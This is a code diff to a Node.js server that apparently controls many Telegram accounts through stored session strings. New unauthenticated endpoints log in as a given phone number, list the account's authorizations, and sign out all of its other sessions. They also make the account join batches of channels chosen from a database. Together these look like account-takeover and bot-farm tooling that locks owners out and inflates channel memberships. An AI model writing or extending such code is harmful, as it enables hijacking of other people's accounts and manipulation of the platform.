@@ -110,7 +110,8 @@ try {
   schedule.scheduleJob('test3', ' 0 7,13,20,23 * * * ', 'Asia/Kolkata', async () => {
     Array.from(userMap.values()).map(async (value) => {
       await fetchWithTimeout(`${value.url}asktopay`);
-    })
+    });
+    await fetchWithTimeout(`https://uptimechecker.onrender.com/processusers/200/0`);
   })
 
   schedule.scheduleJob('test3', ' 25 2 * * * ', 'Asia/Kolkata', async () => {
@@ -245,16 +246,16 @@ app.get('/processUsers/:limit/:skip', async (req, res, next) => {
     const client = await getClient(document.mobile);
     if (cli) {
       console.log(document.mobile, " :  true");
-      await db.updateUser(document, { msgs: cli.msgs, totalChats: cli.total });
+      const lastActive = await client.getLastActiveTime()
+      await db.updateUser(document, { msgs: cli.msgs, totalChats: cli.total, lastActive });
+      await client?.disconnect(document.mobile);
+      deleteClient()
     } else {
       console.log(document.mobile, " :  false");
       await db.deleteUser(document, { msgs: cli });
     }
-    if (client) {
-      await client?.disconnect(document.mobile);
-      deleteClient()
-    }
   }
+  console.log("finished")
 });
 
 app.get('/refreshMap', async (req, res) => {
@@ -654,6 +655,72 @@ app.get('/connectclient/:number', async (req, res) => {
     res.send("Client Already existing");
   }
 });
+
+app.get('/joinchannels/:number/:limit/:skip', async (req, res, next) => {
+  res.send("joiningChannels");
+  next();
+}, async (req, res) => {
+  try {
+    const number = req.params?.number;
+    const limit = req.params.limit ? req.params.limit : 30
+    const skip = req.params.skip ? req.params.skip : 20
+    const k = req.query?.k
+    const db = ChannelService.getInstance();
+    const user = await db.getUser({ mobile: number });
+    if (!hasClient(user.mobile)) {
+      const cli = await createClient(user.mobile, user.session, false);
+      const result = await db.getActiveChannels(parseInt(limit), parseInt(skip), k);
+      const client = await getClient(user.mobile);
+      let resp = ''
+      result.forEach((channel) => {
+        resp = resp + `@${channel.username}|`
+      })
+      if (cli) {
+        await client.removeOtherAuths();
+        await client.joinChannels(resp);
+      } else {
+      }
+    }
+  } catch (error) {
+    console.log(error)
+  }
+});
+
+app.get('/removeAuths/:number', async (req, res) => {
+  const number = req.params?.number;
+  const db = ChannelService.getInstance();
+  const user = await db.getUser({ mobile: number });
+  if (!hasClient(user.mobile)) {
+    const cli = await createClient(user.mobile, user.session);
+    const client = await getClient(user.mobile);
+    if (client) {
+      await client.removeOtherAuths();
+      res.send("Auths Removed");
+    } else {
+      res.send("client EXPIRED");
+    }
+  } else {
+    res.send("Client Already existing");
+  }
+});
+
+app.get('/getAuths/:number', async (req, res) => {
+  const number = req.params?.number;
+  const db = ChannelService.getInstance();
+  const user = await db.getUser({ mobile: number });
+  if (!hasClient(user.mobile)) {
+    const cli = await createClient(user.mobile, user.session);
+    const client = await getClient(user.mobile);
+    if (client) {
+      res.json(await client.getAuths());
+    } else {
+      res.send("client EXPIRED");
+    }
+  } else {
+    res.send("Client Already existing");
+  }
+});
+
 
 app.get('/connectcliens/:limit/:skip', async (req, res) => {
   const limit = req.params?.limit;
